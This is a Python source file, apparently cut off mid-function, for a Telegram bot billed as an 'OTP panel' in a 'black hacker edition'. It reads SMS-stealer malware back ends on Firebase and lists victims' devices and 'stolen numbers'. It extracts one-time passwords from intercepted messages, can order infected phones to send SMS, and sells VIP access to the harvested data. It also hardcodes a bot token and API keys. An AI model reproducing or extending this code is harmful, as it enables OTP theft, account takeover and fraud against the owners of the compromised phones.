#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
  Zero-Lag UI (O(1) Fetch) | Telegram FloodWait Bypass
  Titan RAM Cleaner | 1000+ Users Traffic Optimized
══════════════════════════════════════════════════════
"""

import os
import sys
import re
import time
import json
import random
import asyncio
import logging
import warnings
import traceback
import gc
from datetime import datetime
from typing import Optional
import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest, Forbidden, NetworkError
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# 🛑 Tame Logs for Railway
warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ═══════════════════════════════════════════════════════
#  CONFIGURATION & GLOBALS
# ═══════════════════════════════════════════════════════

POLL_INTERVAL   = 4  
PAGE_SIZE       = 20    
TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
BOT_USERNAME    = "fjjhfbot"

# 🔥 OPTIMIZED FOR RAILWAY 500MB LIMIT
CHUNK_SIZE      = 15    
HTTP_CONCURRENCY= 100    

ADMIN_IDS: set[int] = {
    6860106371,   
}

FORCE_JOIN_CHATS = [
    "@sabkijayhokhush", 
    "@leakmethodfree", 
    "@rosekhudkabanaya"
]

DB_DIR = "Panel_Databases"
USERS_DIR = os.path.join(DB_DIR, "Users")
CLONES_DIR = os.path.join(DB_DIR, "Clones")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
LOCAL_TXT_DB_FILE = os.path.join("Extracted_URLs", "All_Normal_URLs.txt")

seen_ids:  set[str] = set()   
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
total_otps_processed = 0

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  

# 🔥 TELEGRAM API FLOODWAIT BYPASS CACHE
JOIN_VERIFIED_CACHE: dict[int, float] = {}

MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}

SETTINGS = {
    "base_price": 30,
    "global_panels": []
}

API_LOCK = asyncio.Lock()
CACHE_LOCK = asyncio.Lock()  
POLL_LOCK = asyncio.Lock()   
WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 

# Prevents auto-exploit from lagging the UI for other users
HEAVY_TASK_LIMITER = asyncio.Semaphore(10) 

scan_progress = {
    "scanned": 0,
    "total": 0,
    "is_scanning": False
}

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6"
    ],
    "check_anim": "⚡"
}

# ═══════════════════════════════════════════════════════
#  DATABASES
# ═══════════════════════════════════════════════════════

RAW_URLS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com"
]

def load_local_txt_dbs():
    loaded_urls = set()
    files_to_check = ["aiurl.txt", os.path.join("Extracted_URLs", "All_Normal_URLs.txt")]
    for path in files_to_check:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    for line in f:
                        url = line.strip()
                        if url.startswith("http"):
                            loaded_urls.add(url)
            except: pass
    print(f"✅ Loaded {len(loaded_urls)} URLs from Local Text DBs")
    return list(loaded_urls)

RAW_URLS.extend(load_local_txt_dbs())
DATABASES = {f"P_{i}": url for i, url in enumerate(set(RAW_URLS))}

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag
        self.last_sms_ts = last_sms_ts

def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(CLONES_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f:
            f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, SETTINGS, DATABASES
    init_dirs()
    local_dbs = load_local_txt_dbs()
    if local_dbs:
         existing_global = set(SETTINGS.get("global_panels", []))
         existing_global.update(local_dbs)
         SETTINGS["global_panels"] = list(existing_global)

    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f:
                SETTINGS.update(json.load(f))
        except: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
                    all_users[uid] = json.load(f)
                    all_users[uid].setdefault("custom_dbs", [])
                    all_users[uid].setdefault("wishlist", []) 
                    all_users[uid].setdefault("referrals", 0)
                    all_users[uid].setdefault("vip_until", 0.0)
            except: pass
                
    for adm in ADMIN_IDS:
        if adm not in all_users:
            all_users[adm] = {
                "name": "Supreme Owner",
                "username": "",
                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": True,
                "referrals": 0,
                "coins": 999999,
                "vip_until": 2e10,
                "otp_count": 0,
                "bots_created": 0,
                "bonus_10_received": True,
                "custom_dbs": [],
                "wishlist": [] 
            }
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f:
            json.dump(all_users[uid], f, indent=4)

def save_settings():
    init_dirs()
    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4)

# 🔥 TITAN RAM CLEANER (Prevents memory crash entirely)
async def auto_save_loop():
    while True:
        try:
            await asyncio.sleep(60)
            await asyncio.to_thread(save_settings)
            for uid in list(all_users.keys()):
                await asyncio.to_thread(save_user, uid)
                await asyncio.sleep(0) # Yield control to Telegram UI
            
            # Smart Memory Pruning
            if len(seen_ids) > 10000:
                seen_ids.clear()
            
            now_ts = time.time()
            expired_users = [k for k, v in JOIN_VERIFIED_CACHE.items() if now_ts - v > 3600]
            for u in expired_users: JOIN_VERIFIED_CACHE.pop(u, None)
            
            # Clear Dead Devices from Master Vault (Older than 48 hours)
            dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 172800]
            for d in dead_devs: MASTER_DEVICE_DICT.pop(d, None)
            
            gc.collect() 
        except: await asyncio.sleep(5)

async def hourly_admin_backup(app: Application):
    while True:
        await asyncio.sleep(3600)
        try:
            total_users = len(all_users)
            vip_users = sum(1 for u in all_users.values() if u.get("vip_until", 0) > time.time() or u.get("vip_until", 0) > 1e10)
            free_users = total_users - vip_users
            total_custom_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())

            report = (
                "<b>📊 HOURLY ADMIN REPORT</b>\n\n"
                f"👤 <b>Total Users:</b> {total_users}\n"
                f"👑 <b>VIP/Admin Users:</b> {vip_users}\n"
                f"🆓 <b>Free Users:</b> {free_users}\n"
                f"🔗 <b>Total Custom Panels Added:</b> {total_custom_panels}\n\n"
            )
            file_path = os.path.join(SYS_DIR, f"Backup_{int(time.time())}.json")
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(all_users, f, indent=4)
            for adm in ADMIN_IDS:
                try: await app.bot.send_document(adm, document=open(file_path, "rb"), caption=report, parse_mode="HTML")
                except: pass
            try: os.remove(file_path)
            except: pass
        except: pass

def get_user_dbs(uinfo: dict) -> list:
    dbs = uinfo.get("custom_dbs", [])
    valid_urls = []
    for db in dbs:
        if isinstance(db, str): valid_urls.append(db)
        elif isinstance(db, dict): valid_urls.append(db.get("url"))
    if isinstance(uinfo.get("custom_db"), str) and uinfo["custom_db"] not in valid_urls:
        valid_urls.append(uinfo["custom_db"])
    return list(set(valid_urls))

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 0.2: return True  
    user_cooldowns[user_id] = now
    return False

# 🔥 MAGIC BYPASS SHIELD (Prevents /start from freezing)
async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    now = time.time()
    
    # Fast-pass cache (1 hour)
    if user_id in JOIN_VERIFIED_CACHE and (now - JOIN_VERIFIED_CACHE[user_id]) < 3600: 
        return True 

    async def verify():
        for chat in FORCE_JOIN_CHATS:
            try:
                member = await bot.get_chat_member(chat, user_id)
                if member.status in ['left', 'kicked', 'banned']: 
                    return False
            except Exception as e: 
                if "not found" in str(e).lower() or "user not found" in str(e).lower(): return False
        return True
        
    try:
        # Strict 3.0 second timeout. If Telegram servers lag, we let the user pass to avoid bot crash!
        is_member = await asyncio.wait_for(verify(), timeout=3.0)
        if is_member:
            JOIN_VERIFIED_CACHE[user_id] = now
        return is_member
    except asyncio.TimeoutError:
        return True # Fallback: Don't hang the bot for everyone!
    except Exception:
        return True

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    try: logging.error(f"Global Exception: {context.error}")
    except: pass

# ═══════════════════════════════════════════════════════
#  HTTP UTILS
# ═══════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=HTTP_CONCURRENCY, keepalive_timeout=20, enable_cleanup_closed=True)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str, timeout: int = 5) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        if not path: url = url.replace("?shallow=true", ".json")
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else {}
    except: return None

async def fb_keys(path: str, base: str) -> Optional[list[str]]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except: return None

# ═══════════════════════════════════════════════════════
#  API CHECKER FUNCTIONS 
# ═══════════════════════════════════════════════════════

async def check_number_api(service: str, number: str, retries=2) -> dict:
    async with WORKER_SEMAPHORE: 
        clean_number = re.sub(r"\D", "", str(number))[-10:]
        api_keys = SYS_SETTINGS.get("api_keys", [])
        if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}

        for attempt in range(retries):
            async with API_LOCK:
                if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
                selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
                check_number_api.k_idx += 1

            payload = {"service": service.lower(), "number": clean_number}
            start_req = time.time()
            try:
                session = await get_http_session()
                async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                    req_ms = int((time.time() - start_req) * 1000)
                    if r.status == 200: 
                        res = await r.json()
                        res["ms"] = req_ms
                        return res
                    elif r.status == 429:
                        await asyncio.sleep(1)
                        continue
                    else: return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
            except: 
                if attempt == retries - 1: return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
                await asyncio.sleep(0.5)

async def fb_send_sms(device, to_number: str, msg: str):
    async with WORKER_SEMAPHORE:
        try:
            base_node = device.sms_path.replace("/sms", "").replace("user_sms", "user_data")
            send_url = f"{device.base_url}/{base_node}/sendSMS.json"
            payload = {"number": to_number, "phone": to_number, "phoneNo": to_number, "message": msg, "msg": msg, "text": msg, "status": "pending"}
            session = await get_http_session()
            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=4)) as r: pass
        except: pass

async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
    try:
        session = await get_http_session()
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=2"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                if isinstance(data, dict) and len(data) > 0:
                    max_sms_ts = 0
                    for k, sms_val in data.items():
                        if isinstance(sms_val, dict):
                            t_val = sms_val.get("timestamp") or 0
                            try:
                                t_float = float(t_val)
                                if t_float > 1e11: t_float /= 1000
                                if t_float > max_sms_ts: max_sms_ts = t_float
                            except: pass
                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_sec: return True, max_sms_ts
                    return False, max_sms_ts
    except: pass
    return False, 0.0

# ═══════════════════════════════════════════════════════
#  UTILITY FORMATTERS & MENUS (HTML SECURE)
# ═══════════════════════════════════════════════════════

def get_checker_menu(prefix="chk_srv:"):
    kb = [
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(kb)

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    is_admin = chat_id in ADMIN_IDS
    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Target")],
        [KeyboardButton("⚡ Auto-Exploit"), KeyboardButton("☠️ Payload Injector"), KeyboardButton("🦇 Deep Scan")],
        [KeyboardButton("🕸️ Elite Vault"), KeyboardButton("➕ Add Panel"), KeyboardButton("🗑️ Drop Panel")],
        [KeyboardButton("👥 Syndicate (VIP)"), KeyboardButton("📖 Hacker Manual")]
    ]
    if is_admin:
        keys.append([KeyboardButton("Admin Panel")]) 
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_nums = sum(len(d.numbers) for d in devices)
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    
    scan_text = ""
    if scan_progress.get("is_scanning", False):
        scanned = scan_progress.get("scanned", 0)
        tot = scan_progress.get("total", 1)
        pct = int((scanned / max(tot, 1)) * 100)
        scan_text = f"⏳ <b>Live Exploit:</b> {scanned}/{tot} Servers ({pct}%)\n"

    return (
        f"☠️ <b>DARK WEB TERMINAL</b> ☠️\n━━━━━━━━━━━━━━━━━━\n"
        f"{scan_text}"
        f"🟢 Active Nodes: {online}\n"
        f"🔴 Dead Nodes: {offline}\n"
        f"📱 Total Devices: {len(devices)}\n"
        f"🔢 <b>Total Stolen Numbers: {total_nums}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Page {page + 1} of {total_pages}\nSelect a target below:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    rows = []

    def _btn(d: Device) -> InlineKeyboardButton:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs: rows.append([_btn(d)])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("Refresh", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else:
                lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4:
                nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(G-\d{6})\b",             re.IGNORECASE), 
    re.compile(r"\b([A-Z0-9]{5,8})\b",       re.IGNORECASE), 
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def format_sms_block_markdown(sms: dict) -> tuple[str, Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    
    if otp: block = f"🔹 <b>From:</b> <code>{sender}</code>\n📅 <b>Date:</b> {date}\n🔑 <b>OTP:</b> <code>{otp}</code>\n✉️ <b>Msg:</b> {body}"
    else: block = f"🔹 <b>From:</b> <code>{sender}</code>\n📅 <b>Date:</b> {date}\n✉️ <b>Msg:</b> {body}"
    return block, otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ SIM : {sim}\n" if sim else ""
        return f"🔥 PAYLOAD INTERCEPTED\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Target : {num_label}\n│ Source : {sender}\n│ Time : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n{body}"
    return f"📩 DATA INTERCEPTED\n━━━━━━━━━━━━━━━━━━\nTarget : {num_label}\nSource : {sender}\nTime : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
    ])

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users
    total    = len(users_db)
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    return f"☠️ <b>SUPER ADMIN PANEL</b> ☠️\n━━━━━━━━━━━━━━━━━━\nTotal Hackers : {total}\nTotal Exploit Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")], 
        [InlineKeyboardButton("➕ Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("👀 View User Panels", callback_data="sa_view_user_panels")],
        [InlineKeyboardButton("💾 Export Online Numbers", callback_data="sa_export_numbers"), InlineKeyboardButton("📥 Download Logs", callback_data="sa_download_logs")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(keys)

async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try: await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except: pass

def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
    srv_name, emoji = service.capitalize(), "✨"
    for row in get_checker_menu().inline_keyboard:
        for btn in row:
            if service.lower() in btn.text.lower():
                parts = btn.text.split(" ")
                emoji, srv_name = parts[0], " ".join(parts[1:])
                break
    
    display_num = number if str(number).startswith("+") else f"+{number}"
    if is_error: return f"⚠️ <b>ERROR DETECTED</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
    return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"

# ═══════════════════════════════════════════════════════
#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
# ═══════════════════════════════════════════════════════

def push_to_master_vault(temp_devices):
    for d in temp_devices:
        if d.numbers:  
            MASTER_DEVICE_DICT[d.id] = d
    
    dev_list = list(MASTER_DEVICE_DICT.values())
    dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
    GLOBAL_DEVICE_CACHE["ALL"] = dev_list

async def fetch_device_data_task(tag: str, url: str, temp_list: list):
    try:
        added_set = set()
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
        )
            
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                if not nums: continue 
                added_set.add(dev_id)
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
        
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                nums = extract_all_nums(data)
                if not nums: continue 
                added_set.add(dev_id)
                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
        
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                sim_list = client.get("sims", [])
                s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                nums = extract_all_nums(client, s1, s2)
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
    except: pass

async def _update_global_cache():
    global scan_progress
    dbs_to_poll = dict(DATABASES)
    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
        dbs_to_poll[f"G_{i}"] = g_url
            
    for uid, uinfo in all_users.items():
        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS: pass 
        for i, db_url in enumerate(get_user_dbs(uinfo)):
            dbs_to_poll[f"U_{uid}_{i}"] = db_url

    items = list(dbs_to_poll.items())
    scan_progress["total"] = len(items)
    scan_progress["scanned"] = 0
    scan_progress["is_scanning"] = True
    
    for i in range(0, len(items), CHUNK_SIZE):
        chunk = items[i:i + CHUNK_SIZE]
        temp_gathered = []
        
        async def fetch_with_timeout(tag, url):
            try: await asyncio.wait_for(fetch_device_data_task(tag, url, temp_gathered), timeout=8)
            except: pass
            
        tasks = [fetch_with_timeout(tag, url) for tag, url in chunk]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        push_to_master_vault(temp_gathered)
        scan_progress["scanned"] += len(chunk)
        
        temp_gathered.clear()
        await asyncio.sleep(0.01) 

    scan_progress["is_scanning"] = False

async def global_cache_loop():
    while True:
        if not CACHE_LOCK.locked():
            async with CACHE_LOCK:
                try: await _update_global_cache()
                except: pass
        await asyncio.sleep(120) 

# 🔥 CPU DEADLOCK FIX (O(1) CACHE FETCH) -> Instant UI Response
async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
    if users_db is None: users_db = {}
    uinfo = users_db.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS
    
    # VIPs and Admins get instant pointer to the entire master vault (0 CPU cost)
    if is_vip or is_admin:
        return GLOBAL_DEVICE_CACHE.get("ALL", [])

